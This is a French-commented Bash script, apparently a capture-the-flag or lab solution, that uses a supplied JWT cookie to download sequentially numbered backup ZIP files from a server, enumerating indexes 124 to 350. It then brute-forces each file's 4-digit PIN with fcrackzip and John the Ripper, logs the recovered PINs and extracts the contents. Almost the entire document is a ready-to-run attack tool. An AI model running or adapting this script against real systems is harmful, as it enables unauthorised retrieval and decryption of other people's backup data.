#!/bin/bash

# Couleurs pour l'affichage
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# --- CONFIGURATION ---
BASE_URL="http://fileserver.rogue-sentinels.io:8080/api/v1/download?file=backup_2001_"
START=124
END=350
MIN_FILE_SIZE_BYTES=100 # Taille minimale pour considérer qu'il ne s'agit pas d'une page d'erreur
# ---------------------

# --- DEMANDE INTERACTIVE DU TOKEN ---
echo -e "${YELLOW}=== Script de brute force ZIP backups (v3.3 - Parsing John corrigé) ===${NC}"
echo -e "${YELLOW}Téléchargement et cracking de backup_2001_${START}.zip à backup_2001_${END}.zip${NC}\n"

# Demande du token JWT
read -p "$(echo -e "${YELLOW}[?] Veuillez entrer le token JWT pour l'authentification : ${NC}")" JWT_TOKEN

# Vérification simple du token
if [ -z "$JWT_TOKEN" ]; then
    echo -e "${RED}[!] Erreur: Le token JWT est vide. Sortie du script.${NC}"
    exit 1
fi

# Construction de la VALEUR du cookie pour cURL
CURL_COOKIE_VALUE="token=$JWT_TOKEN"

# Créer un dossier pour les téléchargements et s'y déplacer
WORK_DIR="backup_crack_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Fichier POT John (Utilisation d'un fichier pot local au répertoire de travail)
JOHN_POT_FILE="$(pwd)/john.pot"
# Fichier de log de débogage pour les sorties brutes
LOG_FILE="$(pwd)/../crack_debug.log"
echo -e "\n${YELLOW}Les sorties de John/fcrackzip sont enregistrées dans: $(realpath "$LOG_FILE")${NC}"
echo "--- Début du Log à $(date) ---" > "$LOG_FILE"

# Générer la wordlist une seule fois
WORDLIST_FILE="pins.txt"
echo -e "${YELLOW}[*] Génération de la wordlist (1000-9999)...${NC}"
seq 1000 9999 > "$WORDLIST_FILE"

# Fichier de sortie global pour les résultats
RESULTS_FILE="../PASSWORDS_FOUND.txt"
echo "" > "$RESULTS_FILE"

# Boucle sur tous les numéros
for NUM in $(seq "$START" "$END"); do
    FILENAME="backup_2001_${NUM}.zip"
    URL="${BASE_URL}${NUM}.zip"
    HASH_FILE="${FILENAME}.hash"
    
    echo -e "\n${BLUE}====================================================${NC}"
    echo -e "${YELLOW}[*] Traitement de ${FILENAME} (Index ${NUM})...${NC}"
    
    # --- 1. Télécharger le fichier avec cURL ---
    echo -e "${YELLOW}[*] Téléchargement (avec cookie d'auth)...${NC}"
    curl -s -L -b "$CURL_COOKIE_VALUE" "$URL" -o "$FILENAME"
    
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] Échec de la commande cURL pour ${FILENAME}${NC}"
        continue
    fi
    
    # --- 2. Validation du fichier ---
    if [ ! -f "$FILENAME" ]; then
        echo -e "${RED}[!] Fichier ${FILENAME} non trouvé après téléchargement.${NC}"
        continue
    fi
    
    FILE_SIZE=$(stat -c%s "$FILENAME")
    if [ "$FILE_SIZE" -lt "$MIN_FILE_SIZE_BYTES" ]; then
        echo -e "${RED}[!] Fichier ${FILENAME} trop petit ($FILE_SIZE octets). Probablement une page d'erreur. Skip.${NC}"
        rm -f "$FILENAME"
        continue
    fi
    
    echo -e "${GREEN}[✓] Téléchargement réussi ($FILE_SIZE octets)${NC}"
    
    # --- 3. Extraction du hash ---
    echo -e "${YELLOW}[*] Extraction du hash...${NC}"
    zip2john "$FILENAME" > "$HASH_FILE" 2>>"$LOG_FILE"
    
    if [ ! -s "$HASH_FILE" ]; then
        echo -e "${RED}[!] Échec de l'extraction du hash ou fichier hash vide (zip2john a échoué).${NC}"
        continue
    fi
    
    # --- 4. Tenter le crack (Priorité fcrackzip) ---
    PASSWORD=""
    if command -v fcrackzip &> /dev/null; then
        echo -e "${YELLOW}[*] Utilisation de fcrackzip...${NC}"
        RESULT=$(fcrackzip -u -D -p "$WORDLIST_FILE" "$FILENAME" 2>&1)
        echo -e "\n--- fcrackzip ${FILENAME} ---" >> "$LOG_FILE"
        echo "$RESULT" >> "$LOG_FILE"
        
        # Pattern pour capturer le mot de passe après "PASSWORD FOUND: "
        PASSWORD=$(echo "$RESULT" | grep "PASSWORD FOUND:" | tail -n 1 | grep -oP 'PASSWORD FOUND: \K\d+')
        
        if [ ! -z "$PASSWORD" ]; then
            echo -e "${GREEN}[✓] fcrackzip a trouvé le mot de passe.${NC}"
        fi
    fi
    
    # --- 5. Fallback sur John The Ripper (si fcrackzip n'a rien trouvé) ---
    if [ -z "$PASSWORD" ]; then
        echo -e "${YELLOW}[*] fcrackzip n'a rien trouvé. Tentative avec John The Ripper...${NC}"
        # Lancer John pour craquer, en utilisant le pot file local
        john --wordlist="$WORDLIST_FILE" "$HASH_FILE" --format=PKZIP --session=crack_${NUM} --pot="$JOHN_POT_FILE" 2>>"$LOG_FILE"
        
        # Vérifier et extraire le mot de passe
        CRACKED_LINE=$(john --show --pot="$JOHN_POT_FILE" "$HASH_FILE" 2>/dev/null | grep -v "password hash" | head -n1)
        
        echo -e "\n--- John --show ${FILENAME} ---" >> "$LOG_FILE"
        echo "Ligne brute: $CRACKED_LINE" >> "$LOG_FILE"

        # John renvoie le HASH craqué au format 'IDENTIFIANT:PASSWORD'
        if [[ ! "$CRACKED_LINE" =~ "0 password hashes cracked" && ! -z "$CRACKED_LINE" ]]; then
            # CORRECTION : Utilisation de 'cut' pour être plus explicite et fiable.
            # Pour PKZIP, l'identifiant est souvent le hash (ou le nom du fichier) suivi du mot de passe.
            # On cherche à isoler ce qui suit le dernier ':'.
            PASSWORD=$(echo "$CRACKED_LINE" | awk -F: '{print $NF}')
            
            # Vérification supplémentaire pour le cas où John inclut le nom de fichier avant le hash
            if [[ "$PASSWORD" == "$FILENAME" ]]; then
                # Si on obtient le nom du fichier, c'est que le format de John est
                # 'NOM_FICHIER:HASH:PASSWORD'. On utilise cut pour prendre le dernier champ après le hash.
                # L'approche avec awk -F: '{print $NF}' *devrait* capturer la dernière partie.
                # Si le problème persiste, c'est probablement que John renvoie le nom du fichier
                # comme unique champ après le dernier ':'.
                
                # Tentons de capturer le champ juste avant le dernier
                # (Peut être nécessaire si le hash n'est pas considéré comme un champ)
                PASSWORD_TEMP=$(echo "$CRACKED_LINE" | cut -d':' -f 2)
                
                if [[ "$PASSWORD_TEMP" =~ ^[0-9]{4}$ ]]; then
                    PASSWORD="$PASSWORD_TEMP"
                fi
            fi

            echo "Mot de passe extrait: $PASSWORD" >> "$LOG_FILE"
            echo -e "${GREEN}[✓] John The Ripper a trouvé le mot de passe.${NC}"
        fi
    fi
    
    # --- 6. Affichage et Extraction finale ---
    if [ ! -z "$PASSWORD" ] && [[ "$PASSWORD" =~ ^[0-9]{4}$ ]]; then
        echo -e "\n${GREEN}╔════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║   🎉 PASSWORD TROUVÉ ! 🎉             ║${NC}"
        echo -e "${GREEN}╠════════════════════════════════════════╣${NC}"
        echo -e "${GREEN}║ Fichier: ${FILENAME}${NC}"
        echo -e "${GREEN}║ PIN: ${PASSWORD}${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════╝${NC}\n"
        
        # Sauvegarder le résultat
        echo "Fichier: ${FILENAME} | PIN: ${PASSWORD}" >> "$RESULTS_FILE"
        
        # Extraire le contenu 
        unzip -P "$PASSWORD" "$FILENAME" -d "extracted_${NUM}" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓] Contenu extrait dans extracted_${NUM}/${NC}"
        else
            # Le message d'erreur est plus précis ici, car le PIN est validé par John
            echo -e "${RED}[!] Échec de l'extraction. Vérifiez le fichier ZIP (corruption/taille/etc.).${NC}"
        fi
    else
        echo -e "${RED}[!] Mot de passe non trouvé pour ${FILENAME} ou parsing incorrect (${PASSWORD}).${NC}"
        # On supprime le fichier ZIP si le mot de passe n'est pas trouvé
        rm -f "$FILENAME"
    fi
    
    # Nettoyage
    rm -f "$HASH_FILE"
    # Nettoyage des sessions John. Le pot file est conservé pour les cracks futurs.
    rm -f ~/.john/crack_${NUM}.rec
done

# Retour au dossier parent
cd ..

echo -e "\n${GREEN}=== Traitement terminé ===${NC}"
echo -e "${GREEN}Résultats sauvegardés dans: $(realpath "$RESULTS_FILE")${NC}"
echo -e "${GREEN}Logs de débogage des outils dans: $(realpath "$LOG_FILE")${NC}"

# Afficher le résumé
if [ -f "$RESULTS_FILE" ]; then
    echo -e "\n${YELLOW}=== RÉSUMÉ DES MOTS DE PASSE TROUVÉS ===${NC}"
    cat "$RESULTS_FILE"
fi
